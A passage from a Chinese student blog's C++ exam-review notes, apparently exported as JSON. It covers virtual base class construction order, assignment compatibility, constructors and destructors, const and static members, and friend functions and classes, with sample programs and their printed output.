base1(){cout\u0026lt;\u0026lt;\u0026#34;constructing base1\u0026#34;\u0026lt;\u0026lt;endl;} }; class base2 { public: base2(){cout\u0026lt;\u0026lt;\u0026#34;constructing base2\u0026#34;\u0026lt;\u0026lt;endl;} }; class derived1:public base2,virtual public base1 { public: derived1(){cout\u0026lt;\u0026lt;\u0026#34;constructing derived1\u0026#34;\u0026lt;\u0026lt;endl;} }; class derived2:public base2,virtual base1 { public: derived2(){cout\u0026lt;\u0026lt;\u0026#34;constructing derived2\u0026#34;\u0026lt;\u0026lt;endl;} }; class Derived3:public derived1,virtual public derived2 { public: Derived3(){cout\u0026lt;\u0026lt;\u0026#34;constructing derived3\u0026#34;\u0026lt;\u0026lt;endl;} }; int main() { Derived3 obj; return 0; } 调试结果如下 constructing base1 constructing base2 constructing derived2 constructing base2 constructing derived1 constructing derived3 *注意，虚基类的构造函数只调用一次\n*虚基类的构造与析构 C++建立对象时所使用的派生类为最远派生类。对于虚基类而言，由于最远派生类对象中只有一个 公共虚基类子对象，为了初始化该公共子对象，最远派生类的构造函数要调用该公共基类的构造函数 ，而且只能被调用一次。 分为三种情况： 1）虚基类没有构造函数。程序自动调用系统缺省构造函数来初始化派生类对象中的虚基类子对象 2）虚基类中定义了缺省构造函数。程序自动调用自定义的缺省构造函数和析构函数 3）虚基类定义了带参的构造函数···比较复杂 textbook P196 *C++同时规定，在初始化列表中同时出现对虚基类和非虚基类构造函数的调用时，虚基类的构造函数 先于非虚基类的构造函数执行，虚基类的析构顺序与构造顺序完全相反。最先析构的是最远派生类自 身，最后析构的是虚基类\n赋值兼容规则： 1)派生类的对象可以赋值给基类对象 2)派生类的对象可以初始化基类引用 3)派生类对象的地址可以赋给指向基类的指针（指向基类的指针也可以指向派生类 4)通过基类对象名，指针只能使用从基类继承的成员 示例\nclass B0 { public: void display() { cout\u0026lt;\u0026lt;\u0026#34;B0::display()\u0026#34;\u0026lt;\u0026lt;endl; } }; class B1:public B0 { public: void display() { cout\u0026lt;\u0026lt;\u0026#34;B1::display\u0026#34;\u0026lt;\u0026lt;endl; } }; class D1:public B1 { void display() { cout\u0026lt;\u0026lt;\u0026#34;D1::display\u0026#34;\u0026lt;\u0026lt;endl; } }; void fun(B0 *ptr) { ptr-\u0026gt;display(); } int main() { B0 b0; B1 b1; D1 d1; B0 *p; p=\u0026amp;b0; fun(p); p=\u0026amp;b1; fun(p); p=\u0026amp;d1; fun(p); return 0; } 调试结果如下 B0::display() B0::display() B0::display()\ngoodnight 2018.11.22 23：10 ","date":"2018-11-26T16:54:02+08:00","permalink":"https://lizonglingo.github.io/p/c-%E5%9F%BA%E7%A1%80%E5%A4%8D%E4%B9%A0-%E7%BB%A7%E6%89%BF/","title":"C++基础复习—— 继承"},{"content":" C++期末复习随便写写加深一下印象\nC++基础复习—— 类与对象 类和对象 类=数据＋操作（函数）\n1.类 （1）语法： ​\tclass 类名{ ​\tpublic: 函数主要在类外使用，可以在类外访问 ​\tprotected: ​\tprivate: 如果只为类内中的其他函数使用一般设为private ​\t}; （2）使用域限定符 \u0026ldquo;::\u0026rdquo;\n2.构造函数 （1）缺省构造函数：没有构造函数时，系统会自动生成一个默认构造函数，默认所有数据成员值均为其所在数据类型为、意义中的0。 （2）拷贝构造函数：用已经存在的类的对象去构造一个新的对象，两个对象的数据成 员值是完全相同的。 声明格式：\nPoint(Point\u0026amp;); Point(const Point\u0026amp;); 拷贝函数被调用的三种情况：\n用已经存在的对象初始化另一个对象\n对象作为实参传递给形参时\n对象作为函数返回值时\n例：\nclass Point { public: Point(int xx = 0, int yy = 0) { X = xx; Y = yy; } Point(Point \u0026amp;p); //拷贝构造函数 int GetX() { return X; } int GetY() { return Y; } void SetX(int x) { X = x; } void SetY(int y) { Y = y; } private: int X; int Y; }; Point::Point(Point \u0026amp;p) { X = p.X; Y = p.Y; cout \u0026lt;\u0026lt; \u0026#34;Copy constructor is called.\u0026#34; \u0026lt;\u0026lt; endl; } Point Fun(Point p) { Point p1; p1.SetX(p.GetX() + 2); p1.SetY(p.GetY() + 2); return p1; } int main() { Point A(1, 2); Point B(A); //拷贝构造函数被调用，给B赋值 Point C; C = Fun(A); cout \u0026lt;\u0026lt; B.GetX() \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; B.GetY() \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; C.GetX() \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; C.GetY() \u0026lt;\u0026lt; endl; return 0; } 调试结果如下： 1，2 3，4\n3.析构函数 析构函数是用来完成对象被删除之前的一些清理工作的；析构函数是在对象的生存期即将结束的时刻由系统自动调用。调用完成，对象消失，其内存空间被释放。 声明格式：(以Person类为例) ~Person();\n注意：\n析构函数不允许有参数，所以一个类中只能有唯一的析构函数。 先构造的后析构，后构造的先析构(栈) 构造函数与析构函数的调用顺序例题： class Person { public: Person(char* input_name) { name = new char[20]; strcpy(name, input_name); cout \u0026lt;\u0026lt; name \u0026lt;\u0026lt; \u0026#34; Constructor Called.\u0026#34; \u0026lt;\u0026lt; endl; } ~Person() { cout \u0026lt;\u0026lt; name \u0026lt;\u0026lt; \u0026#34; Destructor Called.\u0026#34; \u0026lt;\u0026lt; endl; delete[] name; } void show(); private: char *name; }; void Person::show() { cout \u0026lt;\u0026lt; name \u0026lt;\u0026lt; endl; } int main() { Person student1(\u0026#34;zhangming\u0026#34;); Person student2(\u0026#34;lixin\u0026#34;); student1.show(); student2.show(); return 0; } 调试结果如下： zhangming Constructor Called. lixin Constructor Called. zhangming lixin lixin Destructor Called. zhangming Destructor Called.\n4.常成员 （1）const修饰符 定义常对象语法：\nconst class_Type object_name; or class_Type const object_name; 定义常引用语法：const data_Type \u0026amp; reference_name 常引用经常被用做参数的形参，它能提高函数的运行效率，节省内存，并保证实参不会被更改。 以下为原代码示例：\nvoid display(const int\u0026amp; d); int main() { int d(2008); display(d); return 0; } void display(const int\u0026amp; d) { cout\u0026lt;\u0026lt;d\u0026lt;\u0026lt;endl; } 然而这是一个错误程序，我们来看看报错吧： [Error] assignment of read-only reference \u0026rsquo;d\u0026rsquo; d不可被修改！ （2）常数据成员\n使用const说明的数据成员我们称为常数据成员。 如果一个类中存在常数据成员，那么任何函数成员都不能对该成员赋值。 常数据成员只能在构造函数的初始化列表位置进行初始化 例题：\nclass Point { public: Point(double new_x,double new_y); Point(const Point\u0026amp; p); void disp(); private: double x; const double y; //常数据成员y }; Point::Point(double new_x,double new_y):y(new_y) //初始化列表初始化常数据成员y { x=new_x; } Point::Point(const Point\u0026amp; p):y(p.y) //初始化列表初始化常数据成员y { x=p.x; } void Point::disp() { cout\u0026lt;\u0026lt;\u0026#34;该点的坐标为：(\u0026#34;\u0026lt;\u0026lt;x\u0026lt;\u0026lt;\u0026#34;,\u0026#34;\u0026lt;\u0026lt;y\u0026lt;\u0026lt;\u0026#34;)\u0026#34;\u0026lt;\u0026lt;endl; } int main() { Point p1(1,2),p2(p1); p1.disp(); p2.disp(); return 0; } (3)常函数成员\n说明格式：\nreturn_type function_name(formal parameters list)const; 由于有了const的修饰，该常函数成员和一般函数成员就有了不同，它不能更新对象的数据成员，也不能调用非常函数成员，这样就保证了常函数成员不会改变数据类型成员的值。（const关键字可以被用于对重载函数的区分，例如：void disp(); void disp()const;）\n常函数成员做只读操作 常对象只调用常函数 常函数可以给常/非常对象使用 （4）常对象 对象被const修饰（例如：const Point p(4,5);），因此变成一个常对象，和一般常变量一样，常对象在进行定义时必须进行初始化，而且在生存期内不能被改变。常对象只能调用常函数成员是专门给常对象而准备的。\n5.指向对象的指针 （1）对象指针 语法：\nPerson *p_Person; Person p1; p_Person=\u0026amp;p1; 等价于 Person p1,*p_Person=\u0026amp;p1; (2)this 指针 栗子： Person::Person(string new_name,unsigned new_age) { name=new_name; age=new_age; } 对于系统来讲，每次调用都相当于执行以下语句： this-\u0026gt;name=new_name; this-\u0026gt;age=new_age;\n6.静态成员与友元 （1）静态数据成员与静态函数成员 静态数据成员\n定义格式：static datatypy variablename;\n静态数据成员必须在定义后立即初始化，静态数据成员不属于任何对象，所以其初始化不能由构造函数实现，其初始化通过域限定符在类外实现，语法如下： datatypy classname::avriablename=some_value;\n注意：\n数据型静态函数成员默认值为0，（若在类内有：static int count;即类外初始化count语句可以写为：int Person::count;但该语句不能省略。 静态数据成员不影响对象所占的内存空间。 当常函数成员同时又是静态函数成员时，即静态常函数成员时，其遵循静态成员的特点，需要在类外单独通过赋值语句来初始化。 静态数据成员属于整个类，不属于某个对象；类外初始化，声明在类内。 普通成员函数可以访问非静态和静态函数成员。 可以类外直访的有： 公有静态数据成员 公有普通数据成员\n公有普通数据成员只可由对象访问，公有静态数据成员可以通过类/对象访问。\n静态函数成员\n静态函数成员和其他函数成员一样，属于类而非类的对象，但只能改变类的静态成员（数据/函数）其它函数成员则可以访问类的所有成员。\n声明格式如下： static return_type Function_name(formal parameters list); 和类的其他函数成员一样，静态函数成员既可以定义在类内作为静态内联函数成员，也可在类内声明 在类外定义；在类外定义时static不用写。 例题：\nclass Person { public: Person(string new_name,unsigned new_age); Person(const Person\u0026amp; p); Person(){count++;} void set_name(string new_name); void set_age(unsigned new_age); string get_name(){ return name; } unsigned get_age(){ return age; } void disp(); static int getCount(); private: string name; unsigned age; static int count; //定义静态数据成员count }; int Person::count=0; //使用域限定符在类外初始化静态数据成员 Person::Person(string new_name,unsigned new_age) { name=new_name; age=new_age; count++; } Person::Person(const Person\u0026amp; p) { name=p.name; age=p.age; count++; } int Person::getCount() //静态函数成员在类外定义 { return count; } int main() { Person p1,p2,p3; Person p4(\u0026#34;xiaoming\u0026#34;,21),p5(p4); cout\u0026lt;\u0026lt;\u0026#34;当前Person类对象的个数为：\u0026#34;; cout\u0026lt;\u0026lt;Person::getCount()\u0026lt;\u0026lt;endl; return 0; } 调试结果如下： 当前Person类对象的个数为：5\n7.友元函数与友元类 通过友元机制，一个普通函数或者类的函数成员可以访问到封装在某一个类中的私有数据成员。如果友元是一般函数或者类的函数成员，成为友元函数；如果友元是一个类，则称为友元类，友元类中所有函数成员都是友元函数。 （1）友元函数 声明格式： friend return_type function_name(formal parameters list); 在友元函数体中可以通过对象名访问类的所有成员，包括public private protected 例题，友元函数的使用\nclass Complex { public: Complex(); Complex(const Complex\u0026amp;); Complex(double re,double im); friend bool equal(Complex c1,Complex c2); //友元函数声明 void set_real(double re){real=re;} void set_imag(double im){imag=im;} double get_real(){return real;} double get_imag(){return imag;} void diap(){cout\u0026lt;\u0026lt;real\u0026lt;\u0026lt;\u0026#34;+\u0026#34;\u0026lt;\u0026lt;imag\u0026lt;\u0026lt;\u0026#34;i\u0026#34;;} private: double real; double imag; }; Complex::Complex(double re,double im) { real=re; imag=im; } Complex::Complex(const Complex\u0026amp; comp) { real=comp.real; imag=comp.imag; } bool equal(Complex c1,Complex c2) { if((c1.real==c2.real)\u0026amp;\u0026amp;(c1.imag=c2.imag)) return true; else return false; } int main() { Complex c1(2,3),c2(3,4); if(equal(c1,c2)) cout\u0026lt;\u0026lt;\u0026#34;这两个复数相等！\u0026#34;\u0026lt;\u0026lt;endl; else cout\u0026lt;\u0026lt;\u0026#34;这两个复数不相等！\u0026#34;\u0026lt;\u0026lt;endl; return 0; } 调试结果如下： 这两个复数不相等！ 判断两个复数是否相等的函数，由于直接访问了复数类的private数据成员，避免了频繁调用函数成员，效率大大提高。\n注意：\n友元函数不是类的成员函数，它是类的朋友，使用时不需要类域限定符。 但是要在类中声明通过关键字friend声明，其声明的位置可以在类内任意位置。 友元函数可以在类内实现，也可以在类外实现，在类外实现不需要关键字friend C++中，不允许 构造函数 析构函数 虚函数 为友元函数。 友元函数和类的函数成员一样，可以访问类中的所有成员。不只是非函数成员，一个类的函数成员也可以是另一个类的友元。\n函数成员作为友元：\nclass Student; class Teacher { public: //... void gradeofcourse(Student\u0026amp; S); private: int numberofstu; //... }; class Student { public: //... friend void Teacher::gradeofcourse(Student\u0026amp; S); private: float grad; Teacher* pT; //... }; void Teacher::gradeofcourse(Student\u0026amp; S) { s.grad=5; //直接访问到其他private数据成员grad } (2)友元类 当一个类中的所有函数成员都是另一个类的友元的时候，我们可以定义一个类为另一个类的友元。 例如，下面的代码是把整个Teacher类作为Student类的友元类，即Teacher类的所有函数成员都可以访问Student类的所有成员。\nclass Teacher { public: //... void gradeofcourse(Student\u0026amp; S); //前向声明 private: int numberofstu; //... }; class Student { public: //... friend class Teacher; private: float grad； //... }; 注意：\n类是单向传递的，A是C的友元不等于C是A的友元。即Student类是Teacher类的友元，Teacher类的函数成员可以访问Student类成员，反之则不可以。 下一篇写继承了·\n","date":"2018-11-26T16:25:57+08:00","permalink":"https://lizonglingo.github.io/p/c-%E5%9F%BA%E7%A1%80%E5%A4%8D%E4%B9%A0-%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/","title":"C++基础复习—— 类与对象"}]